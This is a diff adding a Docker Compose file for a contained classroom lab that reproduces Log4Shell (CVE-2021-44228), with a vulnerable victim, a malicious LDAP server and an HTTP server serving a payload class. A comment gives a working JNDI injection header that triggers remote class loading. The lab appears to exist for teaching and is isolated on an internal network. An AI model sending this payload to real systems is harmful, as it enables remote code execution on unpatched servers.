@@ -1,0 +1,42 @@
+# Reproduccion contenida de Log4Shell (CVE-2021-44228) para el curso.
+# La red 'lab' es internal: true -> los contenedores NO tienen salida a internet.
+# El RCE ocurre y se observa dentro de la red Docker; no se exfiltra nada afuera.
+#
+# NO levantar esto en una maquina expuesta. Solo laboratorio en 127.0.0.1.
+name: log4shell-demo
+
+services:
+  # App victima con log4j 2.14.1 (vulnerable). Sin puertos publicados al host:
+  # se dispara desde dentro de la red con el servicio 'trigger'.
+  victim:
+    build: ./victim
+    container_name: l4s-victim
+    networks: [lab]
+
+  # Servidor LDAP malicioso: responde con un referido a la clase remota.
+  attacker-ldap:
+    build: ./attacker-ldap
+    container_name: l4s-ldap
+    networks: [lab]
+    depends_on: [attacker-http]
+
+  # Servidor HTTP que sirve el payload Exploit.class.
+  attacker-http:
+    build: ./attacker-http
+    container_name: l4s-http
+    networks: [lab]
+
+  # Cliente para disparar el ataque (perfil 'tools' -> no arranca solo).
+  # Uso: docker compose run --rm trigger -s \
+  #        -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' \
+  #        http://victim:8080/
+  trigger:
+    image: curlimages/curl:8.11.1
+    networks: [lab]
+    depends_on: [victim, attacker-ldap, attacker-http]
+    profiles: ["tools"]
+    entrypoint: ["curl"]
+
+networks:
+  lab:
+    internal: true   # sin gateway a internet: contencion del lab
